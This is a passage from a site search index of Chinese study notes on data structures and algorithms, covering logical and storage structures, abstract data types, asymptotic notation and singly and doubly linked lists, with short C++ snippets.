</ul>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2001%20%E5%BC%95%E8%A8%80/","title":"Chapter 01 \u200b\u5f15\u8a00","text":""},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2001%20%E5%BC%95%E8%A8%80/#1","title":"1. \u200b\u6570\u636e\u7ed3\u6784","text":"<p>\u200b\u6570\u636e\u7ed3\u6784\u200b\u4e09\u8981\u7d20\u200b: - \u200b\u903b\u8f91\u200b\u7ed3\u6784\u200b - \u200b\u5b58\u50a8\u200b(\u200b\u7269\u7406\u200b)\u200b\u7ed3\u6784\u200b - \u200b\u8fd0\u7b97\u200b</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2001%20%E5%BC%95%E8%A8%80/#11","title":"1.1 \u200b\u903b\u8f91\u200b\u7ed3\u6784","text":"<p>\u200b\u903b\u8f91\u200b\u7ed3\u6784\u200b\u662f\u200b\u5177\u4f53\u200b\u95ee\u9898\u200b\u7684\u200b \u200b\u6570\u5b66\u200b\u62bd\u8c61\u200b, \u200b\u53cd\u6620\u200b\u4e8b\u7269\u200b \u200b\u7ec4\u6210\u200b\u548c\u200b\u903b\u8f91\u5173\u7cfb\u200b.</p> <p>\u200b\u7528\u200b \u200b\u4e00\u7ec4\u200b\u6570\u636e\u200b(\u200b\u7ed3\u70b9\u200b\u96c6\u5408\u200b \\(K\\)) \u200b\u548c\u200b\u6570\u636e\u200b\u95f4\u200b\u7684\u200b \u200b\u4e8c\u5143\u5173\u7cfb\u200b (\u200b\u5173\u7cfb\u200b\u96c6\u5408\u200b \\(R\\)) \u200b\u8868\u793a\u200b.</p> <p>Tips</p> <p>\u200b\u4efb\u4f55\u200b\u4e00\u4e2a\u591a\u5143\u200b\u5173\u7cfb\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u63d2\u5165\u200b\u8fde\u63a5\u200b\u5b9e\u4f53\u200b\u8f6c\u5316\u200b\u4e3a\u200b\u4e8c\u5143\u5173\u7cfb\u200b</p> <p>\u200b\u7528\u200b \\(R\\) \u200b\u7684\u200b\u6027\u8d28\u200b\u6765\u200b\u523b\u753b\u200b\u6570\u636e\u7ed3\u6784\u200b\u7684\u200b\u7279\u70b9\u200b, \u200b\u5e76\u200b\u8fdb\u884c\u200b\u5206\u7c7b\u200b</p> <ul> <li>\u200b\u7ebf\u6027\u200b\u7ed3\u6784\u200b (\u200b\u7ebf\u6027\u8868\u200b, \u200b\u5982\u6808\u200b, \u200b\u961f\u5217\u200b, \u200b\u5b57\u7b26\u4e32\u200b\u7b49\u200b)</li> <li>\u200b\u6811\u5f62\u200b\u7ed3\u6784\u200b (\u200b\u4e8c\u53c9\u6811\u200b, Huffman\u200b\u6811\u200b, \u200b\u4e8c\u53c9\u200b\u68c0\u7d22\u200b\u6811\u200b\u7b49\u200b)</li> <li>\u200b\u56fe\u200b\u7ed3\u6784\u200b (\u200b\u6709\u5411\u56fe\u200b, \u200b\u65e0\u5411\u200b\u56fe\u200b)</li> </ul> <p>\u200b\u6709\u200b\u5982\u4e0b\u200b\u5173\u7cfb\u200b:</p> \\[ \u200b\u56fe\u200b \\supseteq \u200b\u6811\u200b \\supseteq \u200b\u4e8c\u53c9\u6811\u200b \\supseteq \u200b\u7ebf\u6027\u8868\u200b \\]"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2001%20%E5%BC%95%E8%A8%80/#111","title":"1.1.1 \u200b\u7ebf\u6027\u200b\u7ed3\u6784","text":"<p>\u200b\u5173\u7cfb\u200b \\(r\\) \u200b\u6709\u200b\u5411\u200b, \u200b\u6ee1\u8db3\u200b\u5168\u5e8f\u200b\u6027\u548c\u5355\u200b\u7d22\u6027\u200b. - \u200b\u5168\u5e8f\u200b\u6027\u200b: \u200b\u4efb\u4f55\u200b\u4e24\u70b9\u200b\u53ef\u200b\u6bd4\u8f83\u200b\u524d\u540e\u200b. - \u200b\u5355\u200b\u7d22\u6027\u200b: \u200b\u6bcf\u200b\u4e00\u4e2a\u200b\u7ed3\u70b9\u200b\u5b58\u5728\u200b\u552f\u4e00\u200b\u524d\u9a71\u200b\u540e\u7ee7\u200b (\u200b\u9664\u200b\u5934\u5c3e\u200b\u7ed3\u70b9\u200b)</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2001%20%E5%BC%95%E8%A8%80/#112","title":"1.1.2 \u200b\u6811\u5f62\u200b\u7ed3\u6784","text":"<p>\u200b\u6bcf\u4e2a\u200b\u7ed3\u70b9\u200b\u6709\u200b\u552f\u4e00\u200b\u524d\u9a71\u200b, \u200b\u53ef\u200b\u6709\u200b\u591a\u4e2a\u200b\u540e\u7ee7\u200b. (\u200b\u6839\u200b\u8282\u70b9\u200b\u65e0\u200b\u524d\u9a71\u200b)</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2001%20%E5%BC%95%E8%A8%80/#113","title":"1.1.3 \u200b\u56fe\u200b\u7ed3\u6784","text":"<p>\u200b\u5bf9\u200b\u5173\u7cfb\u200b\u65e0\u200b\u4efb\u4f55\u200b\u7ea6\u675f\u200b.</p> <p>\u200b\u603b\u7ed3\u200b: \u200b\u6811\u578b\u200b\u7ed3\u6784\u200b\u548c\u200b\u56fe\u578b\u200b\u7ed3\u6784\u200b\u7684\u200b\u57fa\u672c\u200b\u533a\u522b\u200b\u662f\u200b\u201c\u200b\u6bcf\u4e2a\u200b\u7ed3\u70b9\u200b\u662f\u5426\u200b\u4ec5\u4ec5\u200b\u5c5e\u4e8e\u200b\u4e00\u4e2a\u200b\u76f4\u63a5\u200b\u524d\u9a71\u200b\u201d. \u200b\u800c\u200b\u7ebf\u6027\u200b\u7ed3\u6784\u200b\u548c\u200b\u6811\u578b\u200b\u7ed3\u6784\u200b\u7684\u200b\u57fa\u672c\u200b\u533a\u522b\u200b\u662f\u200b\u201c\u200b\u6bcf\u4e2a\u200b\u7ed3\u70b9\u200b\u662f\u5426\u200b\u4ec5\u4ec5\u200b\u6709\u200b\u4e00\u4e2a\u200b\u76f4\u63a5\u200b\u540e\u7ee7\u200b\u201d.</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2001%20%E5%BC%95%E8%A8%80/#12","title":"1.2 \u200b\u5b58\u50a8\u200b\u7ed3\u6784","text":"<p>\u200b\u4e5f\u200b\u79f0\u200b\u7269\u7406\u200b\u7ed3\u6784\u200b, \u200b\u662f\u200b\u903b\u8f91\u200b\u7ed3\u6784\u200b\u5728\u200b\u8ba1\u7b97\u673a\u200b\u4e2d\u200b\u7684\u200b\u7269\u7406\u200b\u8868\u793a\u200b.</p> <ul> <li>\u200b\u903b\u8f91\u200b\u7ed3\u70b9\u200b\u6620\u5c04\u200b\uff1a\u200b\u5bf9\u4e8e\u200b\u6bcf\u200b\u4e00\u4e2a\u200b\u7ed3\u70b9\u200b \\(j\u2208K\\) \u200b\u90fd\u200b\u5bf9\u5e94\u200b\u4e00\u4e2a\u200b\u552f\u4e00\u200b\u7684\u200b\u5b58\u50a8\u200b\u533a\u57df\u200b \\(c\u2208M\\).</li> <li>\u200b\u903b\u8f91\u5173\u7cfb\u200b\u6620\u5c04\u200b\uff1a\u200b\u6bcf\u4e00\u200b\u5173\u7cfb\u200b\u5143\u7ec4\u200b \\((j_1,j_2)\u2208r\\), \u200b\u6620\u5c04\u200b\u4e3a\u200b\u5b58\u50a8\u5355\u5143\u200b\u7684\u200b\u5730\u5740\u200b\u987a\u5e8f\u200b\u5173\u7cfb\u200b(\u200b\u6216\u200b\u6307\u9488\u200b\u5730\u5740\u200b\u6307\u5411\u200b\u5173\u7cfb\u200b).</li> </ul> <p>\u200b\u56db\u79cd\u200b\u57fa\u672c\u200b\u5b58\u50a8\u200b\u6620\u5c04\u200b\u65b9\u6cd5\u200b: - \u200b\u987a\u5e8f\u200b - \u200b\u94fe\u63a5\u200b - \u200b\u7d22\u5f15\u200b - \u200b\u6563\u5217\u200b</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2001%20%E5%BC%95%E8%A8%80/#121","title":"1.2.1 \u200b\u987a\u5e8f\u5b58\u50a8","text":"<ul> <li>\u200b\u7ed3\u70b9\u200b\u6309\u200b\u5730\u5740\u200b\u76f8\u90bb\u200b\u5173\u7cfb\u200b\u987a\u5e8f\u5b58\u50a8\u200b\uff0c\u200b\u7ed3\u70b9\u200b\u95f4\u200b\u903b\u8f91\u5173\u7cfb\u200b\u7528\u200b\u5b58\u50a8\u5355\u5143\u200b\u7684\u200b\u81ea\u7136\u200b\u987a\u5e8f\u200b\u5173\u7cfb\u200b\u6765\u200b\u8868\u8fbe\u200b </li> <li>\u200b\u6570\u7ec4\u200b\u662f\u200b\u987a\u5e8f\u5b58\u50a8\u200b\u6cd5\u200b\u7684\u200b\u5177\u4f53\u200b\u5b9e\u4f8b\u200b</li> </ul> <p>\u200b\u987a\u5e8f\u5b58\u50a8\u200b\u662f\u200b\u7d27\u51d1\u200b\u5b58\u50a8\u200b\u7ed3\u6784\u200b - \u200b\u7d27\u51d1\u200b\u6307\u200b\u5b58\u50a8\u7a7a\u95f4\u200b\u9664\u200b\u5b58\u50a8\u200b\u6709\u7528\u200b\u6570\u636e\u200b\u5916\u200b\uff0c\u200b\u4e0d\u200b\u5b58\u50a8\u200b\u5176\u4ed6\u200b\u9644\u52a0\u200b\u4fe1\u606f\u200b - \u200b\u5b58\u50a8\u5bc6\u5ea6\u200b\uff1a\u200b\u5b58\u50a8\u200b\u7ed3\u6784\u200b\u6240\u200b\u5b58\u50a8\u200b\u2018\u200b\u6709\u7528\u200b\u6570\u636e\u200b\u2019\u200b\u548c\u200b\u8be5\u200b\u7ed3\u6784\u200b\uff08\u200b\u5305\u62ec\u200b\u9644\u52a0\u200b\u4fe1\u606f\u200b\uff09\u200b\u6574\u4e2a\u200b\u5b58\u50a8\u7a7a\u95f4\u200b\u5927\u5c0f\u200b\u4e4b\u200b\u6bd4\u200b</p> <p>Warning</p> <p>\u200b\u4e8c\u7ef4\u200b\u6570\u7ec4\u200b\u5728\u200b\u903b\u8f91\u200b\u7ed3\u6784\u200b\u4e0a\u200b\u662f\u200b\u975e\u7ebf\u6027\u200b\u7ed3\u6784\u200b, \u200b\u5728\u200b\u5b58\u50a8\u200b\u7ed3\u6784\u200b\u4e0a\u200b\u662f\u200b\u7ebf\u6027\u200b\u5b58\u50a8\u200b.</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2001%20%E5%BC%95%E8%A8%80/#122","title":"1.2.2 \u200b\u94fe\u63a5","text":"<p>\u200b\u5229\u7528\u200b \u200b\u6307\u9488\u200b\u6307\u5411\u200b \u200b\u8868\u793a\u200b\u4e24\u4e2a\u200b\u7ed3\u70b9\u200b\u7684\u200b\u903b\u8f91\u5173\u7cfb\u200b. (eg: \u200b\u94fe\u8868\u200b)</p> <p>\u200b\u589e\u5220\u200b\u5bb9\u6613\u200b\u4f46\u200b\u5b9a\u4f4d\u200b\u56f0\u96be\u200b.</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2001%20%E5%BC%95%E8%A8%80/#123","title":"1.2.3 \u200b\u7d22\u5f15\u200b\u65b9\u6cd5","text":"<p>\u200b\u901a\u8fc7\u200b\u7ed3\u70b9\u200b\u7684\u200b\u7d22\u5f15\u200b\u503c\u200b\u6620\u5c04\u200b\u5230\u200b\u7ed3\u70b9\u200b\u7684\u200b\u5b58\u50a8\u200b\u5730\u5740\u200b</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2001%20%E5%BC%95%E8%A8%80/#124","title":"1.2.4 \u200b\u6563\u5217\u200b\u65b9\u6cd5","text":"<p>\u200b\u5c06\u200b\u5173\u952e\u7801\u200b\u6620\u5c04\u200b\u5230\u200b\u4e00\u4e2a\u200b\u975e\u8d1f\u200b\u6574\u6570\u200b \\(z\\). </p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2001%20%E5%BC%95%E8%A8%80/#2-abstract-data-type","title":"2. \u200b\u62bd\u8c61\u6570\u636e\u7c7b\u578b\u200b(Abstract Data Type)","text":"<p>\u200b\u62bd\u8c61\u6570\u636e\u7c7b\u578b\u200b\u662f\u200b\u7531\u200b &lt;\u200b\u6570\u636e\u200b\u5bf9\u8c61\u200b\uff0c\u200b\u6570\u636e\u200b\u5173\u7cfb\u200b\uff0c\u200b\u6570\u636e\u200b\u64cd\u4f5c\u200b&gt; \u200b\u4e09\u4e2a\u200b\u4e0d\u53ef\u5206\u5272\u200b\u7684\u200b\u90e8\u5206\u200b\u7ec4\u6210\u200b\u7684\u200b\u4e09\u5143\u7ec4\u200b\uff1a</p> <p>ADT\u200b\u62bd\u8c61\u6570\u636e\u7c7b\u578b\u200b\u540d\u200b{</p> <p>\u200b\u6570\u636e\u200b\u5bf9\u8c61\u200bD: &lt;\u200b\u6570\u636e\u200b\u5bf9\u8c61\u200b\u7684\u200b\u5b9a\u4e49\u200b&gt;</p> <p>\u200b\u6570\u636e\u200b\u5173\u7cfb\u200bS: &lt;\u200b\u6570\u636e\u200b\u5173\u7cfb\u200b\u7684\u200b\u5b9a\u4e49\u200b&gt;</p> <p>\u200b\u6570\u636e\u200b\u64cd\u4f5c\u200bP: &lt;\u200b\u57fa\u672c\u64cd\u4f5c\u200b\u7684\u200b\u5b9a\u4e49\u200b&gt;</p> <p>} ADT\u200b\u62bd\u8c61\u6570\u636e\u7c7b\u578b\u200b\u540d\u200b</p> C++<pre><code>template &lt;class T&gt; \u00a0 // \u200b\u6808\u200b\u7684\u200b\u5143\u7d20\u200b\u7c7b\u578b\u200b\u4e3a\u200b T\n\nclass Stack {\n\npublic: \u00a0 \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0// \u200b\u6808\u200b\u7684\u200b\u8fd0\u7b97\u200b\u96c6\u200b\n\n\u00a0 void clear();\u00a0 // \u200b\u53d8\u4e3a\u200b\u7a7a\u6808\u200b\n\n\u00a0\u00a0bool push(const T item); \u00a0 // item\u200b\u5165\u6808\u200b\uff0c\u200b\u6210\u529f\u200b\u8fd4\u56de\u200b\u771f\u200b\uff0c\u200b\u5426\u5219\u200b\u5047\u200b\n\n\u00a0\u00a0bool pop(T &amp; item);\u00a0 // \u200b\u5f39\u6808\u200b\u9876\u200b\uff0c\u200b\u6210\u529f\u200b\u8fd4\u56de\u200b\u771f\u200b\uff0c\u200b\u5426\u5219\u200b\u8fd4\u56de\u200b\u5047\u200b\n\n\u00a0\u00a0bool top(T&amp; item);\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \u00a0 // \u200b\u8bfb\u6808\u200b\u9876\u200b\u4f46\u200b\u4e0d\u5f39\u200b\u51fa\u200b\uff0c\u200b\u6210\u529f\u200b\u771f\u200b\uff0c\u200b\u5426\u5219\u200b\u5047\u200b\n\n\u00a0 bool isEmpty(); \u00a0 // \u200b\u82e5\u6808\u200b\u5df2\u7a7a\u200b\u8fd4\u56de\u200b\u771f\u200b\n\n\u00a0\u00a0bool isFull();\u00a0 \u00a0 // \u200b\u82e5\u6808\u200b\u5df2\u6ee1\u200b\u8fd4\u56de\u200b\u771f\u200b\n\u00a0\u00a0\n};\n</code></pre>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2001%20%E5%BC%95%E8%A8%80/#3","title":"3. \u200b\u7b97\u6cd5","text":"<p>\u200b\u7b97\u6cd5\u200b\u7684\u200b\u6027\u8d28\u200b: - \u200b\u901a\u7528\u6027\u200b - \u200b\u6709\u6548\u6027\u200b - \u200b\u786e\u5b9a\u6027\u200b - \u200b\u6709\u7a77\u6027\u200b</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2001%20%E5%BC%95%E8%A8%80/#4","title":"4. \u200b\u7b97\u6cd5\u200b\u5206\u6790","text":"<p>\u200b\u7b97\u6cd5\u200b\u5206\u6790\u200b\u662f\u200b\u5bf9\u200b\u4e00\u4e2a\u200b\u7b97\u6cd5\u200b\u9700\u8981\u200b\u591a\u5c11\u200b \u200b\u8ba1\u7b97\u200b\u65f6\u95f4\u200b \u200b\u548c\u200b \u200b\u5b58\u50a8\u7a7a\u95f4\u200b \u200b\u4f5c\u200b\u5b9a\u91cf\u200b\u7684\u200b\u5206\u6790\u200b.</p> <p>\u200b\u4e3b\u8981\u200b\u5206\u6790\u200b\u5728\u200b\u6570\u636e\u91cf\u200b\u5f88\u5927\u200b\u7684\u200b\u65f6\u5019\u200b\u7b97\u6cd5\u200b\u7684\u200b\u6e10\u8fdb\u200b\u8d8b\u52bf\u200b.</p> <p>\u200b\u4e00\u822c\u200b\u4ee5\u200b\u8f93\u5165\u200b\u89c4\u6a21\u200b\u4e3a\u200b \\(n\\) \u200b\u65f6\u200b\u6240\u200b\u9700\u200b\u7684\u200b\u57fa\u672c\u200b\u64cd\u4f5c\u6570\u200b \\(f(n)\\) \u200b\u6765\u200b\u63cf\u8ff0\u200b\u65f6\u95f4\u200b\u6548\u7387\u200b.</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2001%20%E5%BC%95%E8%A8%80/#41-o","title":"4.1 \u200b\u5927\u200bO\u200b\u8868\u793a\u6cd5","text":"<p>\u200b\u5927\u200bO\u200b\u8868\u793a\u6cd5\u200b\u7684\u200b\u5b9a\u4e49\u200b</p> <p>\u200b\u82e5\u200b\u5b58\u5728\u200b\u6b63\u6570\u200b \\(c\\) \u200b\u548c\u200b \\(n_0\\), \u200b\u4f7f\u5f97\u200b\u5bf9\u200b\u4efb\u610f\u200b\u7684\u200b \\(n\\geq n_0\\), \u200b\u90fd\u200b\u6709\u200b</p> \\[ f(n)\\leq cg(n) \\] <p>\u200b\u5219\u200b\u79f0\u200b \\(f(n) \\in O(g(n))\\).</p> <p>Example</p> \\[3n\\in O(n)\\] \\[100n+5 \\in O(n^2)\\] \\[n(n-1)/2 \\in O(n^2)\\] <p>\u200b\u5927\u200bO\u200b\u8868\u793a\u6cd5\u200b\u7684\u200b\u6027\u8d28\u200b</p> \\[f(n) \\in O(g(n)), \\ g(n) \\in O(h(n)) \\Rightarrow f(n)\\in O(h(n))\\] \\[f(n)\\in O(h(n)), g(n) \\in O(h(n)) \\Rightarrow f(n)+g(n) \\in O(h(n))\\]"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2001%20%E5%BC%95%E8%A8%80/#42-omega","title":"4.2 Omega\u200b\u8868\u793a\u6cd5","text":"<p>Omega\u200b\u8868\u793a\u6cd5\u200b\u7684\u200b\u5b9a\u4e49\u200b</p> <p>\u200b\u82e5\u200b\u5b58\u5728\u200b\u6b63\u6570\u200b \\(c\\) \u200b\u548c\u200b \\(n_0\\), \u200b\u4f7f\u5f97\u200b\u5bf9\u200b\u4efb\u610f\u200b\u7684\u200b \\(n\\geq n_0\\), \u200b\u90fd\u200b\u6709\u200b</p> \\[ f(n)\\geq cg(n) \\] <p>\u200b\u5219\u200b\u79f0\u200b \\(f(n) \\in \\Omega(g(n))\\).</p> <p>Example</p> \\[3n\\in \\Omega(n)\\] \\[n^3 \\in \\Omega(n^2)\\]"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2001%20%E5%BC%95%E8%A8%80/#43-theta","title":"4.3 Theta\u200b\u8868\u793a\u6cd5","text":"<p>Omega\u200b\u8868\u793a\u6cd5\u200b\u7684\u200b\u5b9a\u4e49\u200b</p> <p>\u200b\u82e5\u200b\u5b58\u5728\u200b\u6b63\u6570\u200b \\(c_1,c_2\\) \u200b\u548c\u200b \\(n_0\\), \u200b\u4f7f\u5f97\u200b\u5bf9\u200b\u4efb\u610f\u200b\u7684\u200b \\(n\\geq n_0\\), \u200b\u90fd\u200b\u6709\u200b</p> \\[ c_1g(n) \\leq f(n)\\leq c_2g(n) \\] <p>\u200b\u5219\u200b\u79f0\u200b \\(f(n) \\in \\Theta(g(n))\\).</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2002%20%E7%BA%BF%E6%80%A7%E8%A1%A8/","title":"Chapter 02 \u200b\u7ebf\u6027\u8868","text":""},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2002%20%E7%BA%BF%E6%80%A7%E8%A1%A8/#1-","title":"1. \u200b\u987a\u5e8f\u200b\u8868\u200b-\u200b\u5411\u91cf","text":"<ul> <li>\u200b\u91c7\u7528\u200b\u5b9a\u957f\u200b\u7684\u200b\u4e00\u7ef4\u200b\u6570\u7ec4\u200b\u5b58\u50a8\u200b\u7ed3\u6784\u200b</li> <li>\u200b\u5b58\u50a8\u200b\u5728\u200b\u8fde\u7eed\u200b\u7a7a\u95f4\u200b, \u200b\u8bfb\u5199\u200b\u65b9\u4fbf\u200b</li> <li>\u200b\u4f7f\u7528\u200b\u5e38\u6570\u200b\u4f5c\u4e3a\u200b\u5411\u91cf\u200b\u957f\u5ea6\u200b, \u200b\u7a0b\u5e8f\u8fd0\u884c\u200b\u65f6\u200b\u4fdd\u6301\u200b\u4e0d\u53d8\u200b.</li> </ul>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2002%20%E7%BA%BF%E6%80%A7%E8%A1%A8/#2","title":"2.\u200b\u94fe\u8868","text":"<ul> <li>\u200b\u6307\u9488\u200b\u6307\u5411\u200b\u4fdd\u6301\u200b\u524d\u9a71\u200b\u5173\u7cfb\u200b\uff0c\u200b\u8282\u70b9\u200b\u4e0d\u5fc5\u200b\u7269\u7406\u200b\u76f8\u90bb\u200b</li> <li>\u200b\u52a8\u6001\u200b\u7533\u8bf7\u200b/\u200b\u91ca\u653e\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u957f\u5ea6\u200b\u52a8\u6001\u53d8\u5316\u200b\uff08\u200b\u63d2\u5165\u200b/\u200b\u5220\u9664\u200b\uff09</li> </ul> <p>\u200b\u5206\u7c7b\u200b: - \u200b\u5355\u94fe\u200b\u8868\u200b - \u200b\u53cc\u94fe\u200b\u8868\u200b - \u200b\u5faa\u73af\u200b\u94fe\u8868\u200b</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2002%20%E7%BA%BF%E6%80%A7%E8%A1%A8/#21","title":"2.1 \u200b\u5355\u94fe\u200b\u8868","text":"C++<pre><code>struct\u00a0 ListNode\n\n{\n\n\u00a0 ELEM\u00a0 data\uff1b\u00a0\u00a0\u00a0\u00a0\u00a0 //\u200b\u5b58\u653e\u200b\u7ebf\u6027\u8868\u200b\u7ed3\u70b9\u200b\u7684\u200b\u6570\u636e\u200b;\n\n\u00a0 ListNode * next;\u00a0\u00a0\u00a0 //\u200b\u5b58\u653e\u200b\u6307\u5411\u200b\u540e\u7ee7\u200b\u7ed3\u70b9\u200b\u7684\u200b\u6307\u9488\u200b\uff1b\n\n\u00a0};\n\ntypedef\u00a0 ListNode *\u00a0 ListPtr;\n\nListPtr head, tail;\u00a0\u00a0\u00a0\u00a0 // head\u200b\u662f\u200b\u5206\u522b\u200b\u6307\u5411\u200b\u5355\u94fe\u200b\u8868\u5934\u200b\u3001\u200b\u5c3e\u200b\u7ed3\u70b9\u200b\u7684\u200b\u6307\u9488\u200b\uff1b\n</code></pre> <p>Warning</p> <p>\u200b\u5355\u94fe\u200b\u8868\u4e2d\u200b\u7684\u200b\u5934\u200b\u8282\u70b9\u200b(head\u200b\u6307\u5411\u200b\u7684\u200b\u8282\u70b9\u200b)\u200b\u4e0d\u200b\u4f5c\u4e3a\u200b\u8868\u4e2d\u200b\u7684\u200b\u5b9e\u9645\u200b\u5143\u7d20\u200b, \u200b\u503c\u200b\u5ffd\u7565\u200b.</p> <p>\u200b\u8bbf\u95ee\u200b\u65f6\u200b\u5fc5\u987b\u200b\u4ece\u200b head \u200b\u5f00\u59cb\u67e5\u627e\u200b\u94fe\u8868\u200b\u4e2d\u200b\u7684\u200b\u5143\u7d20\u200b.</p> <p>\u200b\u8bbf\u95ee\u200b\u4e0b\u6807\u200b\u4e3a\u200b -1 \u200b\u5219\u200b\u5b9a\u4f4d\u200b\u5230\u5934\u200b\u7ed3\u70b9\u200b</p> <p>Tips</p> <p>1.\u200b\u7531\u4e8e\u200b\u5f00\u59cb\u200b\u7ed3\u70b9\u200b\u7684\u200b\u4f4d\u7f6e\u200b\u88ab\u200b\u5b58\u653e\u200b\u5728\u200b\u5934\u200b\u7ed3\u70b9\u200b\u7684\u200b\u6307\u9488\u200b\u57df\u200b\u4e2d\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5728\u200b\u94fe\u8868\u200b\u7684\u200b\u7b2c\u4e00\u4e2a\u200b\u4f4d\u7f6e\u200b\u4e0a\u200b\u7684\u200b\u64cd\u4f5c\u200b\u5c31\u200b\u548c\u200b\u5728\u200b\u8868\u200b\u7684\u200b\u5176\u5b83\u200b\u4f4d\u7f6e\u200b\u4e0a\u200b\u64cd\u4f5c\u200b\u4e00\u81f4\u200b\uff0c\u200b\u65e0\u987b\u200b\u8fdb\u884c\u200b\u7279\u6b8a\u200b\u5904\u7406\u200b;</p> <p>2.\u200b\u65e0\u8bba\u200b\u94fe\u8868\u200b\u662f\u5426\u200b\u4e3a\u7a7a\u200b\uff0c\u200b\u5176\u5934\u200b\u6307\u9488\u200b\u662f\u200b\u6307\u5411\u200b\u5934\u200b\u7ed3\u70b9\u200b\u7684\u200b\u975e\u7a7a\u200b\u6307\u9488\u200b\uff08\u200b\u7a7a\u8868\u4e2d\u5934\u200b\u7ed3\u70b9\u200b\u7684\u200b\u6307\u9488\u200b\u57df\u7a7a\u200b\uff09\uff0c\u200b\u56e0\u6b64\u200b\u7a7a\u8868\u200b\u548c\u200b\u975e\u7a7a\u8868\u200b\u7684\u200b\u5904\u7406\u200b\u4e5f\u200b\u5c31\u200b\u7edf\u4e00\u200b\u4e86\u200b\u3002</p> C++<pre><code>//\u200b\u65e0\u5934\u200b\u7ed3\u70b9\u200b\uff0c\u200b\u987b\u200b\u5bf9\u200bi\u200b\u4e3a\u200b0\u200b\u7684\u200b\u63d2\u5165\u200b\u4f4d\u7f6e\u200b\u4f5c\u200b\u7279\u6b8a\u200b\u5904\u7406\u200b\n\nListNode * Insert(int i, T value){\n\n\u00a0\u00a0\u00a0\u00a0 if ( i==0){\n\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 s = new ListNode;\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 //\u200b\u751f\u6210\u200b\u65b0\u200b\u7ed3\u70b9\u200b\n\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 s-&gt;data = value; s-&gt;next = head;\u00a0 // \u200b\u63d2\u5165\u200b\u5230\u200b\u94fe\u8868\u200bL\u200b\u4e2d\u200b\n\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 head = s; \u00a0 \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0// \u200b\u4fee\u6539\u200b\u94fe\u5934\u200b\u6307\u9488\u200bL\n\n\u00a0\u00a0\u00a0 }else{\n\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \u2026\u2026\uff08\u200b\u89c1\u200b27\u200b\u9875\u200b\uff09\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 //\u200b\u540c\u6709\u5934\u200b\u7ed3\u70b9\u200b\u7b97\u6cd5\u200b\u7684\u200b\u5904\u7406\u200b;\n\n\u00a0\u00a0\u00a0 }\n\n\u00a0\u00a0\u00a0 return true;\n\n}\n</code></pre> <p>\u200b\u5355\u94fe\u200b\u8868\u200b\u7684\u200b\u4e0d\u8db3\u200b: \u200b\u4ec5\u200b\u6709\u200b\u540e\u7ee7\u200b\u8282\u70b9\u200b, \u200b\u4e0d\u80fd\u200b\u6709\u6548\u200b\u67e5\u627e\u200b\u524d\u9a71\u200b.</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2002%20%E7%BA%BF%E6%80%A7%E8%A1%A8/#22","title":"2.2 \u200b\u53cc\u94fe\u200b\u8868","text":"C++<pre><code>struct\u00a0 DblListNode\n\n{\n\n\u00a0 T \u00a0 \u00a0data;\n\n\u00a0 DblListNode *prev;\n\n\u00a0 DblListNode *next;\n\n};\n</code></pre> <p>\u200b\u6ce8\u610f\u200b\u63d2\u200b\u5220\u65f6\u200b\u7684\u200b\u64cd\u4f5c\u200b\u987a\u5e8f\u200b.</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2002%20%E7%BA%BF%E6%80%A7%E8%A1%A8/#23","title":"2.3 